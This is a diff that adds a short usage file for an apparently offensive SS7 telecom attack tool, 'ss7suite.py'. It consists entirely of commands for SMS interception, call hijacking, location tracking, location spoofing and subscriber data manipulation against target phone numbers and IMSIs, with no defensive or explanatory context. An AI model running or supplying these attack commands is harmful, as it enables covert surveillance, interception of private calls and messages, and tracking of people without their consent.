@@ -1,0 +1,14 @@
+# SMS Interception
+python ss7suite.py sms --msisdn +12345678901 --interface eth0
+
+# Call Hijacking
+python ss7suite.py call --msisdn +12345678901 --interface eth0
+
+# Location Tracking
+python ss7suite.py locate --imsi 123456789012345 --interface eth0
+
+# Location Spoofing
+python ss7suite.py spoof --imsi 123456789012345 --new-location "Berlin" --interface eth0
+
+# Subscriber Data Manipulation
+python ss7suite.py subdata --imsi 123456789012345 --new-data '{"field":"value"}' --interface eth0
